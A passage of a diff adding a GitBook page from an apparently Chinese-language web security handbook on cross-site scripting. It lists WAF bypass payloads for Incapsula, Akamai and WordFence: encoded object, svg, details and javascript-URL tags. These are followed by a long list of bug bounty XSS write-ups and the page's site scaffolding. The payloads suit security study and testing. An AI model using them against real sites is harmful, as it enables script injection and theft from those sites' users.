+<h3 id="incapsula-waf-bypass-by-c0d3g33k---11th-september-2018">Incapsula WAF Bypass by <a href="https://twitter.com/c0d3G33k" target="_blank">@c0d3G33k</a> - 11th september 2018</h3>
+<pre><code class="lang-javascript">&lt;object data=<span class="hljs-string">&apos;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span>
+</code></pre>
+<h3 id="incapsula-waf-bypass-by-daveysec---11th-may-2019">Incapsula WAF Bypass by <a href="https://twitter.com/daveysec/status/1126999990658670593" target="_blank">@daveysec</a> - 11th may 2019</h3>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>\<span class="hljs-attr">r</span>\<span class="hljs-attr">n</span>=<span class="hljs-string">$.globalEval(&quot;al&quot;+&quot;ert()&quot;);</span>&gt;</span>
+</code></pre>
+<h3 id="akamai-waf-bypass-by-zseano---18th-june-2018">Akamai WAF Bypass by <a href="https://twitter.com/zseano" target="_blank">@zseano</a> - 18th june 2018</h3>
+<pre><code class="lang-javascript">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;
+</code></pre>
+<h3 id="akamai-waf-bypass-by-s0md3v---28th-october-2018">Akamai WAF Bypass by <a href="https://twitter.com/s0md3v/status/1056447131362324480" target="_blank">@s0md3v</a> - 28th october 2018</h3>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()</span> <span class="hljs-attr">x</span>&gt;</span>
+</code></pre>
+<h3 id="wordfence-waf-bypass-by-brutelogic---12th-september-2018">WordFence WAF Bypass by <a href="https://twitter.com/brutelogic" target="_blank">@brutelogic</a> - 12th september 2018</h3>
+<pre><code class="lang-javascript">&lt;a href=javas&amp;#99;ript:alert(1)&gt;
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" target="_blank">Unleashing-an-Ultimate-XSS-Polyglot</a></li>
+<li>tbm</li>
+<li><a href="http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html" target="_blank">(Relative Path Overwrite) RPO XSS - Infinite Security</a></li>
+<li><a href="http://www.thespanner.co.uk/2014/03/21/rpo/" target="_blank">RPO TheSpanner</a></li>
+<li><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank">RPO Gadget - innerthmtl</a></li>
+<li><a href="http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite" target="_blank">Relative Path Overwrite - Detectify</a></li>
+<li><a href="http://d3adend.org/xss/ghettoBypass" target="_blank">XSS ghettoBypass - d3adend</a></li>
+<li><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank">XSS without HTML: Client-Side Template Injection with AngularJS</a></li>
+<li><a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html" target="_blank">XSSING WEB PART - 2 - Rakesh Mane</a></li>
+<li><a href="https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5" target="_blank">Making an XSS triggered by CSP bypass on Twitter. @tbmnull</a></li>
+<li><a href="https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309" target="_blank">Ways to alert(document.domain) - @tomnomnom</a></li>
+<li><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf" target="_blank">D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs</a></li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/" target="_blank">Sleeping stored Google XSS Awakens a $5000 Bounty</a> by Patrik Fehrenbach</li>
+<li><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank">RPO that lead to information leakage in Google</a> by filedescriptor</li>
+<li><a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/" target="_blank">God-like XSS, Log-in, Log-out, Log-in</a> in Uber by Jack Whitton </li>
+<li><a href="http://www.breaksec.com/?p=6129" target="_blank">Three Stored XSS in Facebook</a> by Nirgoldshlager </li>
+<li><a href="https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify" target="_blank">Using a Braun Shaver to Bypass XSS Audit and WAF</a> by Frans Rosen  </li>
+<li><a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/" target="_blank">An XSS on Facebook via PNGs &amp; Wonky Content Types</a> by Jack Whitton</li>
+<li><a href="https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/" target="_blank">Stored XSS in *.ebay.com</a> by Jack Whitton</li>
+<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss" target="_blank">Complicated, Best Report of Google XSS</a> by Ramzes</li>
+<li><a href="https://hackerone.com/reports/150179" target="_blank">Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com</a> by secgeek</li>
+<li><a href="http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html" target="_blank">Command Injection in Google Console</a> by Venkat S</li>
+<li><a href="http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html" target="_blank">Facebook&apos;s Moves - OAuth XSS</a> by PAULOS YIBELO</li>
+<li><a href="http://hmgmakarovich.blogspot.hk/2015/11/stored-xss-in-google-docs-bug-bounty.html" target="_blank">Stored XSS in Google Docs (Bug Bounty)</a> by Harry M Gertos</li>
+<li><a href="https://hackerone.com/reports/152067" target="_blank">Stored XSS on developer.uber.com via admin account compromise in Uber</a> by James Kettle (albinowax)</li>
+<li><a href="https://klikki.fi/adv/yahoo.html" target="_blank">Yahoo Mail stored XSS</a> by Klikki Oy</li>
+<li><a href="http://mksben.l0.cm/2016/07/xxn-caret.html" target="_blank">Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)</a> by Masato Kinugawa</li>
+<li><a href="https://labs.detectify.com/2015/06/06/google-xss-turkey/" target="_blank">Youtube XSS</a> by fransrosen</li>
+<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter" target="_blank">Best Google XSS again</a> - by Krzysztof Kotowicz</li>
+<li><a href="https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/" target="_blank">IE &amp; Edge URL parsin Problem</a> - by detectify</li>
+<li><a href="http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html" target="_blank">Google XSS subdomain Clickjacking</a></li>
+<li><a href="http://blog.wesecureapp.com/xss-by-tossing-cookies/" target="_blank">Microsoft XSS and Twitter XSS</a></li>
+<li><a href="http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/" target="_blank">Google Japan Book XSS</a> </li>
+<li><a href="https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/" target="_blank">Flash XSS mega nz</a> - by frans</li>
+<li><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/" target="_blank">Flash XSS in multiple libraries</a> - by Olivier Beg</li>
+<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html" target="_blank">xss in google IE, Host Header Reflection</a></li>
+<li><a href="http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf" target="_blank">Years ago Google xss</a></li>
+<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html" target="_blank">xss in google by IE weird behavior</a></li>
+<li><a href="https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/" target="_blank">xss in Yahoo Fantasy Sport</a></li>
+<li><a href="https://klikki.fi/adv/yahoo2.html" target="_blank">xss in Yahoo Mail Again, worth $10000</a> by Klikki Oy</li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/" target="_blank">Sleeping XSS in Google</a> by securityguard</li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/" target="_blank">Decoding a .htpasswd to earn a payload of money</a> by securityguard</li>
+<li><a href="http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form" target="_blank">Google Account Takeover</a></li>
+<li><a href="http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/" target="_blank">AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2</a> by geekboy</li>
+<li><a href="https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html" target="_blank">Uber Self XSS to Global XSS</a></li>
+<li><a href="https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g" target="_blank">How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)</a> by Marin MoulinierFollow</li>
+<li><a href="https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/" target="_blank">Airbnb &#x2013; When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities</a> by Brett </li>
+<li><a href="http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html" target="_blank">XSSI, Client Side Brute Force</a>  </li>
+<li><a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank">postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson</a></li>
+<li><a href="https://hackerone.com/reports/231053" target="_blank">postMessage XSS Bypass</a></li>
+<li><a href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/" target="_blank">XSS in Uber via Cookie</a> by zhchbin</li>
+<li><a href="https://hackerone.com/reports/207042" target="_blank">Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP</a> by frans</li>
+<li><a href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/" target="_blank">XSS due to improper regex in third party js Uber 7k XSS</a> </li>
+<li><a href="https://hackerone.com/reports/262230" target="_blank">XSS in TinyMCE 2.4.0</a> by Jelmer de Hen</li>
+<li><a href="https://hackerone.com/reports/150179" target="_blank">Pass uncoded URL in IE11 to cause XSS</a></li>
+<li><a href="http://blog.blackfan.ru/2017/09/devtwittercom-xss.html" target="_blank">Twitter XSS by stopping redirection and javascript scheme</a> by Sergey Bobrov </li>
+<li><a href="http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html" target="_blank">Auth DOM Uber XSS</a></li>
+<li><a href="https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/" target="_blank">Managed Apps and Music: two Google reflected XSSes</a></li>
+<li><a href="https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/" target="_blank">App Maker and Colaboratory: two Google stored XSSes</a></li>
+<li><a href="https://www.youtube.com/watch?v=d9UEVv3cJ0Q&amp;feature=youtu.be" target="_blank">XSS in www.yahoo.com</a> </li>
+<li><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html" target="_blank">Stored XSS, and SSRF in Google using the Dataset Publishing Language</a></li>
+<li><a href="https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd" target="_blank">Stored XSS on Snapchat</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                
+                <a href="../跨站请求伪造-CSRF/" class="navigation navigation-next navigation-unique" aria-label="Next page: 跨站请求伪造-CSRF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"跨站脚本攻击-XSS","level":"2.2.1","depth":2,"next":{"title":"跨站请求伪造-CSRF","level":"2.2.2","depth":2,"path":"跨站请求伪造-CSRF/README.md","ref":"跨站请求伪造-CSRF/README.md","articles":[]},"previous":{"title":"前端安全","level":"2.2","depth":1,"ref":"","articles":[{"title":"跨站脚本攻击-XSS","level":"2.2.1","depth":2,"path":"跨站脚本攻击-XSS/README.md","ref":"跨站脚本攻击-XSS/README.md","articles":[]},{"title":"跨站请求伪造-CSRF","level":"2.2.2","depth":2,"path":"跨站请求伪造-CSRF/README.md","ref":"跨站请求伪造-CSRF/README.md","articles":[]},{"title":"CORS配置错误","level":"2.2.3","depth":2,"path":"CORS配置错误/README.md","ref":"CORS配置错误/README.md","articles":[]},{"title":"Web缓存泄露","level":"2.2.4","depth":2,"path":"Web缓存泄露/README.md","ref":"Web缓存泄露/README.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"跨站脚本攻击-XSS/README.md","mtime":"2019-09-15T21:20:24.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-09-16T07:03:19.203Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
